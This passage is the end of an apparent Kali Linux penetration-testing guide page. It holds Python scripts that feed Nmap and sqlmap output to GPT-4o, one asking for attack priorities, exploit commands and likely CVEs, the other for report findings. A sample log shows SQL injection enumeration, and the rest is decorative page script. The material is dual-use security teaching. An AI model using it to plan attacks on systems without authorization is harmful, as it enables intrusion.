+    <span style="color:#bd93f9">return</span> hosts
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">ai_attack_surface</span>(hosts):
+    prompt = (
+        <span style="color:#ff79c6">"You are a senior penetration tester. Analyse this Nmap scan output and provide:
+"
+        "1. ATTACK SURFACE SUMMARY - key findings per host
+"
+        "2. HIGH-PRIORITY TARGETS - most likely to yield access and why
+"
+        "3. RECOMMENDED COMMANDS - exact Metasploit/searchsploit/nikto commands to run next
+"
+        "4. VULNERABILITY HYPOTHESES - likely CVEs based on service versions
+"
+        "5. ENGAGEMENT PRIORITY ORDER - which host to attack first and approach
+
+"</span>
+        <span style="color:#ff79c6">"Nmap results:
+"</span> + json.dumps(hosts, indent=2)
+    )
+    r = openai.OpenAI().chat.completions.create(
+        model=<span style="color:#ff79c6">"gpt-4o"</span>,
+        messages=[{<span style="color:#ff79c6">"role"</span>:<span style="color:#ff79c6">"user"</span>, <span style="color:#ff79c6">"content"</span>:prompt}]
+    )
+    <span style="color:#bd93f9">return</span> r.choices[0].message.content
+
+xml_path = sys.argv[1] <span style="color:#bd93f9">if</span> len(sys.argv) > 1 <span style="color:#bd93f9">else</span> <span style="color:#ff79c6">"scan.xml"</span>
+hosts = parse_nmap_xml(xml_path)
+<span style="color:#8be9fd">print</span>(<span style="color:#ff79c6">f"[*] Analysed {len(hosts)} live hosts, sending to GPT...
+"</span>)
+<span style="color:#8be9fd">print</span>(ai_attack_surface(hosts))</code>
+  </div>
+  <div class="cb cb-ai rv" data-l="AI -- Automated Pentest Report Generator from Tool Output">
+    <code><span style="color:#bd93f9">#!/usr/bin/env python3</span>
+<span style="color:var(--t3)"># Automated penetration test finding generator
+# Feed raw tool output (Nmap/Nikto/sqlmap), get structured finding for report</span>
+
+<span style="color:#bd93f9">import</span> openai, json
+
+<span style="color:#8be9fd">def</span> <span style="color:var(--c)">generate_finding</span>(tool_name, raw_output, target):
+    prompt = (
+        <span style="color:#ff79c6">"You are an expert penetration test report writer. Convert this raw tool output "
+        "into a professional penetration test finding. Return JSON only:
+"</span>
+        <span style="color:#ff79c6">"{
+"
+        "  "title": "finding title",
+"
+        "  "severity": "Critical|High|Medium|Low|Informational",
+"
+        "  "cvss_score": "X.X",
+"
+        "  "cvss_vector": "CVSS:4.0/...",
+"
+        "  "affected_system": "target",
+"
+        "  "description": "technical description",
+"
+        "  "impact": "business impact",
+"
+        "  "evidence": "key evidence from tool output",
+"
+        "  "remediation": "specific remediation steps"
+"
+        "}
+
+"</span>
+        <span style="color:#ff79c6">f"Tool: {tool_name}
+Target: {target}
+Output:
+{raw_output}"</span>
+    )
+    r = openai.OpenAI().chat.completions.create(
+        model=<span style="color:#ff79c6">"gpt-4o"</span>,
+        messages=[{<span style="color:#ff79c6">"role"</span>:<span style="color:#ff79c6">"user"</span>, <span style="color:#ff79c6">"content"</span>:prompt}],
+        response_format={<span style="color:#ff79c6">"type"</span>:<span style="color:#ff79c6">"json_object"</span>}
+    )
+    <span style="color:#bd93f9">return</span> json.loads(r.choices[0].message.content)
+
+<span style="color:var(--t3)"># Example: sqlmap discovered SQL injection</span>
+raw_sqlmap = <span style="color:#ff79c6">"""
+[INFO] testing connection to target URL
+[INFO] GET parameter 'id' is vulnerable. Do you want to exploit...
+[INFO] the back-end DBMS is MySQL
+[INFO] retrieved: information_schema,webapp_db,users
+"""</span>
+
+finding = generate_finding(<span style="color:#ff79c6">"sqlmap"</span>, raw_sqlmap, <span style="color:#ff79c6">"https://target.com/search?id=1"</span>)
+<span style="color:#8be9fd">print</span>(json.dumps(finding, indent=2))</code>
+  </div>
+</section>
+
+<div class="cta rv">
+  <div class="cta-t">// The quieter you become, the more you can hear. //</div>
+  <p class="cta-p">Kali Linux is not just a tool -- it is an environment, a methodology, and a mindset. Mastering its tool ecosystem means understanding not just which command to run, but why each tool works the way it does, what it reveals about the target, and how the output connects to the next phase of the engagement. Add AI to accelerate analysis and reporting, and you have the most powerful penetration testing platform available to any security professional today.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub -- nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+<footer class="footer">
+  <div class="f-l">Nisarg Chasmawala (Shroff)<br><span class="f-alias">// HEAVEN</span></div>
+  <div class="f-r">Offensive Security Engineer &middot; MSc Cyber Security, BCU<br>CEH Master &middot; CPENT &middot; CHFI &middot; ISO 27001 Lead Auditor<br><a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a></div>
+</footer>
+</div>
+<script>
+var cur=document.getElementById('cur'),cur2=document.getElementById('cur2'),cur3=document.getElementById('cur3');
+var mx=0,my=0;
+document.addEventListener('mousemove',function(e){mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px';});
+(function loop(){cur2.style.left=mx+'px';cur2.style.top=my+'px';cur3.style.left=mx+'px';cur3.style.top=my+'px';requestAnimationFrame(loop);})();
+document.querySelectorAll('a,.btn,.ai-card,.panel,.cb,.tc,.tool-card').forEach(function(el){
+  el.addEventListener('mouseenter',function(){cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)';});
+  el.addEventListener('mouseleave',function(){cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)';});
+});
+window.addEventListener('scroll',function(){document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%';});
+
+// PARTICLE NETWORK
+(function(){
+  var c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  var W,H,mX=innerWidth/2,mY=innerHeight/2,N=200,MAX=140,P=[];
+  function Pt(){this.reset(true);}
+  Pt.prototype.reset=function(i){this.x=Math.random()*W;this.y=i?Math.random()*H:H+10;this.z=Math.random()*3+.5;this.vx=(Math.random()-.5)*.4;this.vy=(Math.random()-.5)*.4-.1;this.life=Math.random()*300+200;this.maxLife=this.life;this.r=Math.random()*1.5+.5;var r=Math.random();this.color=r<.7?'0,255,65':r<.9?'0,229,255':'191,0,255';};
+  Pt.prototype.update=function(){var dx=this.x-mX,dy=this.y-mY,d=Math.sqrt(dx*dx+dy*dy);if(d<120){var f=(120-d)/120;this.vx+=dx/d*f*.6;this.vy+=dy/d*f*.6;}this.vx*=.98;this.vy*=.98;this.x+=this.vx;this.y+=this.vy;this.life--;if(this.life<=0||this.x<-50||this.x>W+50||this.y<-50||this.y>H+50)this.reset(false);};
+  Pt.prototype.draw=function(){var a=(this.life/this.maxLife)*.7*this.z;ctx.beginPath();ctx.arc(this.x,this.y,this.r*this.z,0,Math.PI*2);ctx.fillStyle='rgba('+this.color+','+a+')';ctx.fill();};
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight;}
+  function lines(){for(var i=0;i<P.length;i++){for(var j=i+1;j<P.length;j++){var a=P[i],b=P[j],dx=a.x-b.x,dy=a.y-b.y,d=Math.sqrt(dx*dx+dy*dy);if(d<MAX){var al=(1-d/MAX)*.18,g=ctx.createLinearGradient(a.x,a.y,b.x,b.y);g.addColorStop(0,'rgba('+a.color+','+al+')');g.addColorStop(1,'rgba('+b.color+','+al+')');ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.strokeStyle=g;ctx.lineWidth=(a.z+b.z)/2*.5;ctx.stroke();}}}}
+  function animate(){ctx.clearRect(0,0,W,H);var g=ctx.createRadialGradient(mX,mY,0,mX,mY,80);g.addColorStop(0,'rgba(0,255,65,0)');g.addColorStop(.7,'rgba(0,255,65,0.04)');g.addColorStop(1,'rgba(0,255,65,0)');ctx.fillStyle=g;ctx.beginPath();ctx.arc(mX,mY,80,0,Math.PI*2);ctx.fill();lines();P.forEach(function(p){p.update();p.draw();});requestAnimationFrame(animate);}
+  resize();window.addEventListener('resize',resize);document.addEventListener('mousemove',function(e){mX=e.clientX;mY=e.clientY;});
+  for(var i=0;i<N;i++)P.push(new Pt());animate();
+})();
+
+// HEX GRID
+(function(){
+  var c=document.getElementById('bg-hex'),ctx=c.getContext('2d');
+  var W,H,t=0,S=40;
+  function resize(){W=c.width=innerWidth;H=c.height=innerHeight;}
+  function hex(cx,cy,s){ctx.beginPath();for(var i=0;i<6;i++){var a=Math.PI/180*(60*i-30);if(i===0)ctx.moveTo(cx+s*Math.cos(a),cy+s*Math.sin(a));else ctx.lineTo(cx+s*Math.cos(a),cy+s*Math.sin(a));}ctx.closePath();}
+  function draw(){ctx.clearRect(0,0,W,H);t+=.008;var sy=window.scrollY,cols=Math.ceil(W/(S*1.732))+2,rows=Math.ceil(H/(S*1.5))+2;for(var r=-1;r<rows;r++){for(var col=-1;col<cols;col++){var cx=col*S*1.732+(r%2)*S*.866,cy=r*S*1.5-(sy*.03)%(S*1.5),w=Math.sin(t+col*.3+r*.2)*.5+.5;hex(cx,cy,S-2);ctx.strokeStyle='rgba(0,255,65,'+(0.02+w*0.07)+')';ctx.lineWidth=.6;ctx.stroke();if(w>.92){hex(cx,cy,S-2);ctx.fillStyle='rgba(0,255,65,'+(0.02+w*0.03)+')';ctx.fill();}}}requestAnimationFrame(draw);}
+  resize();window.addEventListener('resize',resize);draw();
+})();
+
+// HERO 3D: MULTI-RING TOOL ORBIT SYSTEM
+// Three tilted rings with Kali tools orbiting around a central Kali core
+(function(){
+  var c=document.getElementById('hero-geo');if(!c)return;
+  var ctx=c.getContext('2d'),SZ=500;c.width=SZ;c.height=SZ;
+
+  // Tools distributed across 3 orbital rings
+  var ring1Tools=['Nmap','Metasploit','Burp Suite','Wireshark','Aircrack-ng','sqlmap'];
+  var ring2Tools=['Hydra','Hashcat','BloodHound','LinPEAS','ffuf','Gobuster'];
+  var ring3Tools=['theHarvester','Nikto','Netcat','John','CrackMapExec','Volatility'];
+
+  var rings=[
+    {tools:ring1Tools, radius:135, tiltX:0.5, tiltZ:0.2, speed:0.007, color:'0,229,255', offset:0},
+    {tools:ring2Tools, radius:160, tiltX:-0.4, tiltZ:0.6, speed:0.005, color:'0,255,65', offset:2.1},
+    {tools:ring3Tools, radius:110, tiltX:1.1, tiltZ:-0.3, speed:0.009, color:'191,0,255', offset:4.2}
+  ];
+
+  var mrx=0,mry=0,t=0;
+  document.addEventListener('mousemove',function(e){mrx=(e.clientY/innerHeight-.5)*.25;mry=(e.clientX/innerWidth-.5)*.35;});
+
+  function rotY(x,y,z,a){return[x*Math.cos(a)+z*Math.sin(a),y,-x*Math.sin(a)+z*Math.cos(a)];}
+  function rotX(x,y,z,a){return[x,y*Math.cos(a)-z*Math.sin(a),y*Math.sin(a)+z*Math.cos(a)];}
+  function proj(x,y,z){var f=440,d=f/(f+z+250);return[x*d+SZ/2,y*d+SZ/2,z];}
+
+  function draw(){
+    ctx.clearRect(0,0,SZ,SZ);
+    t+=.016;
+    var globalRY=t*0.3+mry;
+    var globalRX=mrx;
+
+    // Central Kali core
+    var cg=ctx.createRadialGradient(SZ/2,SZ/2,0,SZ/2,SZ/2,32);
+    cg.addColorStop(0,'rgba(0,255,65,'+(0.4+Math.sin(t*2)*.1)+')');
+    cg.addColorStop(.6,'rgba(0,229,255,0.15)');
+    cg.addColorStop(1,'rgba(0,255,65,0)');
+    ctx.fillStyle=cg;ctx.beginPath();ctx.arc(SZ/2,SZ/2,32,0,Math.PI*2);ctx.fill();
+
+    // Draw "KALI" text at center
+    var kPulse=Math.sin(t*1.5)*.5+.5;
+    ctx.font='bold 15px Orbitron,sans-serif';
+    ctx.fillStyle='rgba(0,255,65,'+(0.5+kPulse*.4)+')';
+    ctx.textAlign='center';ctx.textBaseline='middle';
+    ctx.fillText('KALI',SZ/2,SZ/2-1);
+
+    // Collect all visible points for depth sorting
+    var allPts=[];
+
+    rings.forEach(function(ring,ri){
+      var N=ring.tools.length;
+      var angle=t*ring.speed+ring.offset;
+
+      // Draw ring ellipse first
+      var ringPts=[];
+      for(var s=0;s<=64;s++){
+        var a=s/64*Math.PI*2;
+        var rx3=ring.radius*Math.cos(a), ry3=0, rz3=ring.radius*Math.sin(a);
+        var r1=rotX(rx3,ry3,rz3,ring.tiltX);
+        var r2=rotY(r1[0],r1[1],r1[2],ring.tiltZ+globalRY);
+        var r3=rotX(r2[0],r2[1],r2[2],globalRX);
+        var p=proj(r3[0],r3[1],r3[2]);
+        ringPts.push(p);
+      }
+      ctx.beginPath();ctx.moveTo(ringPts[0][0],ringPts[0][1]);
+      for(var s=1;s<ringPts.length;s++)ctx.lineTo(ringPts[s][0],ringPts[s][1]);
+      ctx.closePath();
+      ctx.strokeStyle='rgba('+ring.color+',0.12)';ctx.lineWidth=1;ctx.stroke();
+
+      // Tool nodes orbiting
+      for(var i=0;i<N;i++){
+        var toolAngle=angle+i/N*Math.PI*2;
+        var nx=ring.radius*Math.cos(toolAngle);
+        var ny=0;
+        var nz=ring.radius*Math.sin(toolAngle);
+        var r1=rotX(nx,ny,nz,ring.tiltX);
+        var r2=rotY(r1[0],r1[1],r1[2],ring.tiltZ+globalRY);
+        var r3=rotX(r2[0],r2[1],r2[2],globalRX);
+        var p=proj(r3[0],r3[1],r3[2]);
+        allPts.push({px:p[0],py:p[1],pz:p[2],label:ring.tools[i],color:ring.color,pulse:i/N});
+      }
+    });
+
+    // Sort by z depth and draw
+    allPts.sort(function(a,b){return a.pz-b.pz;});
+    allPts.forEach(function(n){
+      var dep=(n.pz+250)/500;if(dep<0.05)return;
+      var pulse=Math.sin(t*2+n.pulse*Math.PI*2)*.5+.5;
+      var r=dep*5+2;
+
+      // Glow
+      var ng=ctx.createRadialGradient(n.px,n.py,0,n.px,n.py,r*3.5);
+      ng.addColorStop(0,'rgba('+n.color+','+dep*.3*pulse+')');ng.addColorStop(1,'rgba('+n.color+',0)');
+      ctx.fillStyle=ng;ctx.beginPath();ctx.arc(n.px,n.py,r*3.5,0,Math.PI*2);ctx.fill();
+
+      // Core dot
+      ctx.beginPath();ctx.arc(n.px,n.py,r,0,Math.PI*2);
+      ctx.fillStyle='rgba('+n.color+','+dep*.9+')';ctx.fill();
+
+      // Label
+      if(dep>0.35){
+        ctx.font=Math.floor(dep*6.5+4)+'px Share Tech Mono';
+        ctx.fillStyle='rgba('+n.color+','+dep*(.55+pulse*.25)+')';
+        ctx.textAlign='center';ctx.textBaseline='top';
+        ctx.fillText(n.label,n.px,n.py+r+2);
+      }
+    });
+
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+// SCROLL REVEAL
+var rv=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting)x.target.classList.add('on');});},{threshold:.08});
+document.querySelectorAll('.rv,.rv-l').forEach(function(el){rv.observe(el);});
+
+// TOC
+var sIds=['hero','install','recon','web','password','exploit','postex','wireless','ai'];
+var tItems=document.querySelectorAll('.toc-i');
+var so=new IntersectionObserver(function(e){e.forEach(function(x){if(x.isIntersecting)tItems.forEach(function(t){t.classList.toggle('active',t.dataset.s===x.target.id);});});},{threshold:.25});
+sIds.forEach(function(id){var el=document.getElementById(id);if(el)so.observe(el);});
+function goTo(h){document.querySelector(h).scrollIntoView({behavior:'smooth'});}
+
+// CODE COPY
+document.querySelectorAll('.cb').forEach(function(b){
+  b.title='Click to copy';
+  b.addEventListener('click',function(){
+    navigator.clipboard.writeText(b.querySelector('code').innerText).catch(function(){});
+    var o=b.getAttribute('data-l');b.setAttribute('data-l',o+' \u2713 COPIED');
+    setTimeout(function(){b.setAttribute('data-l',o);},2000);
+  });
+});
+</script>
+</body>
+</html>
